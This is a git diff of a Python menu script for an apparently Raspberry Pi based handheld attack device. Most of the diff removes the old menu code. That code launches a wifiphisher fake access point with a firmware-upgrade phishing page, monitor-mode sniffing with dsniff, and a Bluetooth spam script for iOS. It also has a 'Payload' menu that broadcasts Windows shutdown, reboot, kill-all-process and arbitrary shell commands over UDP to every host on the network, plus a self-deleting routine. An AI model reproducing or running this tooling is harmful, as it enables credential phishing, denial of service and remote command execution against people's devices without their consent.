@@ -8,12 +8,10 @@ import hashlib
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
-import socket
-import sys
 import psutil
 import json
 # Network settings
-BROADCAST_IP = '<broadcast>' 
+BROADCAST_IP = '<broadcast>'
 PORT = 12345  # Port
 
 
@@ -44,11 +42,6 @@ Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
 disp.LCD_Init(Lcd_ScanDir)
 disp.LCD_Clear()
 
-
-
-
-
-
 def list_files_in_directory(directory):
     """List all files in the specified directory without extensions."""
     return [os.path.splitext(f)[0] for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
@@ -56,19 +49,19 @@ def list_files_in_directory(directory):
 def draw_file_menu(files, selected_index):
     """Draw the file menu on the display in a grid format."""
     draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-    
+
     # Definire dimensioni della griglia
     num_cols = 3  # Numero di colonne
     num_rows = 4  # Numero di righe
     item_width = width // num_cols
     item_height = 20  # Altezza dell'elemento, puoi modificarlo se necessario
-    
+
     for i, file in enumerate(files):
         col = i % num_cols
         row = i // num_cols
         x = col * item_width
         y = row * item_height
-        
+
         if i == selected_index:
             text_size = draw.textbbox((0, 0), file, font=font)
             text_width = text_size[2] - text_size[0]
@@ -105,7 +98,7 @@ def show_file_menu():
 
     def draw_file_menu(files, selected_index, num_cols, num_rows):
         num_items = len(files)
-        
+
         # Calcola le dimensioni delle celle
         cell_width = width // num_cols
         cell_height = height // num_rows
@@ -148,12 +141,12 @@ def show_file_menu():
             # Esegui l'azione sul file selezionato
             execute_file(directory, selected_file)  # Passa solo il nome base del file
             break
-        if GPIO.input(KEY1_PIN) == 0:  
+        if GPIO.input(KEY1_PIN) == 0:
             break
-        if GPIO.input(KEY2_PIN) == 0:  
+        if GPIO.input(KEY2_PIN) == 0:
             break
-        if GPIO.input(KEY3_PIN) == 0: 
-            break    
+        if GPIO.input(KEY3_PIN) == 0:
+            break
 
 def generate_key_from_password(password: str) -> bytes:
     """Genera una chiave AES a partire dalla password."""
@@ -334,7 +327,7 @@ def get_keyboard_input():
             input_text = input_text[:-1]
             draw_keyboard(selected_key_index, input_text, mode, caps_lock)
             time.sleep(0.3)
-        
+
         if GPIO.input(KEY2_PIN) == 0:  # Se KEY2 (P20) è premuto, aggiungi uno spazio
             input_text += ' '
             draw_keyboard(selected_key_index, input_text, mode, caps_lock)
@@ -399,7 +392,7 @@ def read_theme_color(json_file_path1='app/setting/config.json'):
         with open(json_file_path1, 'r') as json_file:
             config = json.load(json_file)
             theme_color = config.get('Theme')
-            
+
             if theme_color and isinstance(theme_color, list) and len(theme_color) == 3:
                 return tuple(theme_color)
             else:
@@ -410,7 +403,7 @@ def read_theme_color(json_file_path1='app/setting/config.json'):
         return None
     except Exception as e:
         print(f"An error occurred: {e}")
-        return None    
+        return None
 def draw_menu(selected_index):
     # Clear previous image
 
@@ -423,7 +416,7 @@ def draw_menu(selected_index):
 
     # Ottieni il livello della batteria
     battery_level, plugged_in = get_battery_level()
-    
+
     # Visualizza messaggio sul livello della batteria o "NB!" a sinistra
     if battery_level is None:
         draw.text((5, 0), "NB!", font=font, fill=(255, 0, 0))  # Messaggio di errore a sinistra
@@ -456,393 +449,37 @@ def show_message(message, duration=2):
     disp.LCD_ShowImage(image, 0, 0)
     time.sleep(duration)
     disp.LCD_Clear()
-
-returner()
-
-while True:
-    draw_menu(selected_index)
-
+def bk(): # Back Keys
+    if GPIO.input(KEY1_PIN) == 0:
+        return True
+    if GPIO.input(KEY2_PIN) == 0:
+        return True
+    if GPIO.input(KEY3_PIN) == 0:
+        return True
+    
+def draw_sub_menu(sub_selected_index, sub_menu_options):
+    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
+    for i, option in enumerate(sub_menu_options):
+        y = i * 20
+        if i == sub_selected_index:
+            text_size = draw.textbbox((0, 0), option, font=font)
+            text_width = text_size[2] - text_size[0]
+            text_height = text_size[3] - text_size[1]
+            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))
+            draw.text((1, y), option, font=font, fill=(0, 0, 0))
+        else:
+            draw.text((1, y), option, font=font, fill=(255, 255, 255))
+    disp.LCD_ShowImage(image, 0, 0)
+    
+def mc(sub_menu_options): # Menu Configuration, don't confuse this with Mc Donald.
     if GPIO.input(KEY_UP_PIN) == 0:
-        selected_index = (selected_index - 1) % len(menu_options)
-        draw_menu(selected_index)
+        sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
+        draw_sub_menu(sub_selected_index)
         time.sleep(0.3)
     if GPIO.input(KEY_DOWN_PIN) == 0:
-        selected_index = (selected_index + 1) % len(menu_options)
-        draw_menu(selected_index)
+        sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
+        draw_sub_menu(sub_selected_index)
         time.sleep(0.3)
     if GPIO.input(KEY_PRESS_PIN) == 0:
-        selected_option = menu_options[selected_index]
-        show_message(f"Selected: {selected_option}", 1)
-
-        if selected_option == "Networks":
-            # Draw and handle the Network sub-menu
-            sub_menu_options = ["Wifi", "Deauth", "Firewall"]
-            sub_selected_index = 0
-
-            def draw_sub_menu(sub_selected_index):
-                draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-                for i, option in enumerate(sub_menu_options):
-                    y = i * 20
-                    if i == sub_selected_index:
-                        text_size = draw.textbbox((0, 0), option, font=font)
-                        text_width = text_size[2] - text_size[0]
-                        text_height = text_size[3] - text_size[1]
-                        draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))
-                        draw.text((1, y), option, font=font, fill=(0, 0, 0))
-                    else:
-                        draw.text((1, y), option, font=font, fill=(255, 255, 255))
-                disp.LCD_ShowImage(image, 0, 0)
-
-            while True:
-                draw_sub_menu(sub_selected_index)
-
-                if GPIO.input(KEY_UP_PIN) == 0:
-                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_DOWN_PIN) == 0:
-                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_PRESS_PIN) == 0:
-                    sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
-
-                    if sub_selected_option == "Wifi":
-                        sub_menu_options = ["Fake AP", "Sniff"]
-                        sub_selected_index = 0
-
-                        while True:
-                            draw_sub_menu(sub_selected_index)
-
-                            if GPIO.input(KEY_UP_PIN) == 0:
-                                sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
-                                draw_sub_menu(sub_selected_index)
-                                time.sleep(0.3)
-                            if GPIO.input(KEY_DOWN_PIN) == 0:
-                                sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
-                                draw_sub_menu(sub_selected_index)
-                                time.sleep(0.3)
-                            if GPIO.input(KEY_PRESS_PIN) == 0:
-                                sub_selected_option = sub_menu_options[sub_selected_index]
-                                show_message(f"Selected: {sub_selected_option}", 1)
-
-                            if sub_selected_option == "Fake AP":
-                                show_message("Create a name for\n the fake AP", 3)
-                                fakeAp = get_keyboard_input()  # Prende il nome inserito dall'utente
-                                # Esegui wifiphisher con il nome del fake AP
-                                command = subprocess.run(
-                                    ["sudo", "wifiphisher", "-i", "wlan0", "-e", f"{fakeAp}", "-p", "firmware-upgrade"],
-                                    capture_output=True, text=True
-                                )
-
-                                # Mostra il risultato del comando
-                                if command.returncode == 0:
-                                    show_message(f"Fake AP '{fakeAp}' created successfully", 3)
-                                else:
-                                    show_message(f"Error: {command.stderr}", 3)
-
-                                show_message("Press joystick to stop", 3)
-                                
-                                # Loop per aspettare che l'utente interrompa il processo
-                                while True:
-                                    show_message(command.stdout, 1)  # Mostra output in tempo reale (facoltativo)
-                                    if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
-                                        break
-                            if sub_menu_options == "Sniff":
-                                    os.system("sudo ifconfig wlan0 down")
-                                    os.system("sudo iwconfig wlan0 mode monitor")
-                                    os.system("sudo airmon-ng start wlan0")
-                                    os.system("sudo ifconfig wlan0 up")
-                                    command = subprocess.run(
-                                    ["sudo", "dsniff", "-i", "wlan0mon"],
-                                    capture_output=True, text=True
-                                    )
-                                    while True:
-                                        show_message(command.stdout, 1)  
-                                        if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
-                                            break
-                                        
-
-        elif selected_option == "Party":
-            # Draw and handle the Network sub-menu
-            sub_menu_options = ["Login", "Join a Party", "Create a Party", "Leave Party", "Exit"]
-            sub_selected_index = 0
-
-            def draw_sub_menu(sub_selected_index):
-                draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-                for i, option in enumerate(sub_menu_options):
-                    y = i * 20
-                    if i == sub_selected_index:
-                        text_size = draw.textbbox((0, 0), option, font=font)
-                        text_width = text_size[2] - text_size[0]
-                        text_height = text_size[3] - text_size[1]
-                        draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))
-                        draw.text((1, y), option, font=font, fill=(0, 0, 0))
-                    else:
-                        draw.text((1, y), option, font=font, fill=(255, 255, 255))
-                disp.LCD_ShowImage(image, 0, 0)
-
-            while True:
-                draw_sub_menu(sub_selected_index)
-
-                if GPIO.input(KEY_UP_PIN) == 0:
-                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_DOWN_PIN) == 0:
-                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_PRESS_PIN) == 0:
-                    sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
-
-                    if sub_selected_option == "Join a Party":
-                        show_message("Select the party name", 3)
-                        partyName = get_keyboard_input()
-                        show_message("Select the password of party", 3)
-                        partyPassword = get_keyboard_input()
-                        # Esegui il comando usando subprocess.run per ottenere l'output
-                        result = subprocess.run(["sudo", "hamachi", "join", partyName, partyPassword], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
-                        time.sleep(1)
-                    elif sub_selected_option == "Create a Party":
-                        show_message("Create a party name", 3)
-                        CpartyName = get_keyboard_input()
-                        show_message("Create a password", 3)
-                        CpartyPassword = get_keyboard_input()
-                        # Esegui il comando usando subprocess.run per ottenere l'output
-                        result = subprocess.run(["sudo", "hamachi", "create", CpartyName, CpartyPassword], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
-                        time.sleep(1)
-                    elif sub_selected_option == "Login":
-                        result = subprocess.run(["sudo", "login"], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
-                    elif sub_selected_option == "Leave Party":
-                        show_message("Write the party name\nto confirm leaving", 3)
-                        LpartyName = get_keyboard_input()
-                        result = subprocess.run(["sudo", "hamachi", "leave", LpartyName,], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
-
-
-                    break  # Exit sub-menu to main menu
-
-        elif selected_option == "Bluetooth":
-            def run_bleddos():
-                os.system("sudo bash bleddos.sh")
-            sub_menu_options = ["Spam"]
-            sub_selected_index = 0
-
-            def draw_sub_menu(sub_selected_index):
-                draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-                for i, option in enumerate(sub_menu_options):
-                    y = i * 20
-                    if i == sub_selected_index:
-                        text_size = draw.textbbox((0, 0), option, font=font)
-                        text_width = text_size[2] - text_size[0]
-                        text_height = text_size[3] - text_size[1]
-                        draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))
-                        draw.text((1, y), option, font=font, fill=(0, 0, 0))
-                    else:
-                        draw.text((1, y), option, font=font, fill=(255, 255, 255))
-                disp.LCD_ShowImage(image, 0, 0)
-
-            while True:
-                draw_sub_menu(sub_selected_index)
-
-                if GPIO.input(KEY_UP_PIN) == 0:
-                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_DOWN_PIN) == 0:
-                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_PRESS_PIN) == 0:
-                    sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
-
-
-                   
-
-                    if sub_selected_option == "Spam":
-                        sub_menu_options = ["iOS", "Exit"]
-                        sub_selected_index = 0
-
-                        while True:
-                            draw_sub_menu(sub_selected_index)
-
-                            if GPIO.input(KEY_UP_PIN) == 0:
-                                sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
-                                draw_sub_menu(sub_selected_index)
-                                time.sleep(0.3)
-                            if GPIO.input(KEY_DOWN_PIN) == 0:
-                                sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
-                                draw_sub_menu(sub_selected_index)
-                                time.sleep(0.3)
-                            if GPIO.input(KEY_PRESS_PIN) == 0:
-                                sub_selected_option = sub_menu_options[sub_selected_index]
-                                show_message(f"ì{sub_selected_option}", 1)
-
-                                if sub_selected_option == "iOS":
-                                    os.system("sudo python3 iphone.py")
-                                    show_image("bkat.png", lambda: GPIO.input(KEY_PRESS_PIN) == 0)  # Show image until button press
-                                    break
-
-                        
-                                
-
-
-
-        elif selected_option == "App & Plugin":
-            while True:
-                if GPIO.input(KEY1_PIN) == 0:  
-                    break
-                if GPIO.input(KEY2_PIN) == 0:  
-                    break
-                if GPIO.input(KEY3_PIN) == 0: 
-                    break
-                else:
-                    show_file_menu() 
-
-
-
-
-
-
-
-
-
-        elif selected_option == "Payload":
-
-
-            def shutdownWin():
-                """Invia un messaggio di shutdown a tutti gli utenti sulla rete."""
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                message = 'shutdown /s /f /t 0'
-                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
-
-            def rebootWin():
-                """Invia un messaggio di reboot a tutti gli utenti sulla rete."""
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                message = 'shutdown /r /f /t 0'
-                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
-
-            def RickRoll():
-                """Invia un link di Rick Roll a tutti gli utenti sulla rete."""
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                message = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
-                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
-
-            def KillEmAll():
-                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                message = 'powershell -Command "Get-Process | Where-Object { $_.Name -ne \'explorer\' } | ForEach-Object { $_.Kill() }"'
-                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
-
-            def Crash():
-                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                message = 'taskkill /F /FI "STATUS eq RUNNING"'
-                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
-
-
-            def Terminal():
-                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                show_message("Type 'Leave' for exit", 3)
-                while True:
-                    message = get_keyboard_input()
-                    if message == "Leave":
-                        break
-                    else:
-                        sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                        show_message("Command Executed", 1)
-
-            def self_destruct():
-                """Rimuove il file di script."""
-                try:
-                    file_path = sys.argv[0]  # Ottieni il percorso dello script corrente
-                    os.remove(file_path)
-                    show_message("DESTROYED", 3)
-                except Exception as e:
-                    show_message("--- ERROR --", 3)
-
-            sub_menu_options = ["Shutdown", "Reboot", "RickRoll", "Kill All Process", "SELF DESTRUCTION", "Cmd", "Exit"]
-            sub_selected_index = 0
-
-            def draw_sub_menu(sub_selected_index):
-                draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-                for i, option in enumerate(sub_menu_options):
-                    y = i * 20
-                    if i == sub_selected_index:
-                        text_size = draw.textbbox((0, 0), option, font=font)
-                        text_width = text_size[2] - text_size[0]
-                        text_height = text_size[3] - text_size[1]
-                        draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))
-                        draw.text((1, y), option, font=font, fill=(0, 0, 0))
-                    else:
-                        draw.text((1, y), option, font=font, fill=(255, 255, 255))
-                disp.LCD_ShowImage(image, 0, 0)
-
-            while True:
-                draw_sub_menu(sub_selected_index)
-
-                if GPIO.input(KEY_UP_PIN) == 0:
-                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_DOWN_PIN) == 0:
-                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
-                    draw_sub_menu(sub_selected_index)
-                    time.sleep(0.3)
-                if GPIO.input(KEY_PRESS_PIN) == 0:
-                    sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
-
-                    if sub_selected_option == "Shutdown":
-                        shutdownWin()
-
-                    if sub_selected_option == "Reboot":
-                        rebootWin()
-
-                    if sub_selected_option == "RickRoll":
-                        RickRoll()
-
-                    if sub_selected_option == "Kill All Process":
-                        KillEmAll() # Metallica Reference?!
-                    if sub_selected_option == "Exit":
-                        break
-
-                    if sub_selected_option == "Terminal":
-                        Terminal()
-                    if sub_selected_option == "SELF DESTRUCTION":
-                        show_message("Type 'y' to confirm\nSELF DESTRUCTION", 3)
-                        request = get_keyboard_input()
-                        if request == 'y':
-                            self_destruct()
-                            break
-                        else:
-                            show_message("SELF DESTRUCTION STOPPED.", 3)
-                            break
-                    
-
-
-        elif selected_option == "Shutdown":
-            show_message("Shutting down...", 2)
-            time.sleep(1)
-            subprocess.call(['sudo', 'shutdown', '-h', 'now'])
-        else:
-            show_message("Unknown option", 2)
+        sub_selected_option = sub_menu_options[sub_selected_index]
+        show_message(f"Selected: {sub_selected_option}", 1)
